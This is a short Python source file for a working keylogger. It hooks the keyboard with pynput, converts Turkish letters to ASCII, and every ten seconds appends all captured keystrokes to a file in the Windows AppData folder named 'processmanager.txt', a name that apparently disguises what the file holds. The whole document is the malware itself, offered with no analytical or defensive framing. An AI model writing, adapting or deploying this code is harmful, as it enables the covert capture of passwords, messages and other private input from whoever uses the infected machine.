#!/usr/bin/python
# -*- coding: utf-8 -*-

import pynput.keyboard
import threading
import os

log = ""

path = os.environ["appdata"] + "\\processmanager.txt"

def process_keys(key):
	global log
	try:
		if (key == "ğ"):
			log += str("g")
		elif (key == "ö"):
			log += str("o")
		elif (key == "ü"):
			log += str("u")
		elif (key == "ı"):
			 log += str("i")
		elif (key == "ş"):
			log += str("s")
		elif (key == "ç"):
			log += str("c")
		else:
			log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
		elif key == key.left:
			log = log + ""
		elif key == key.right:
			log = log + ""
		elif key == key.up:
			log = log + ""
		elif key == key.down:
			log = log + ""
		else:
			log = log + " " + str(key) + " "
	print(log)


def report():
	global log
	global path
	fin = open(path,"a")
	fin.write(log)
	log = ""
	fin.close()
	timer = threading.Timer(10,report)
	timer.start()

def start():

	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()
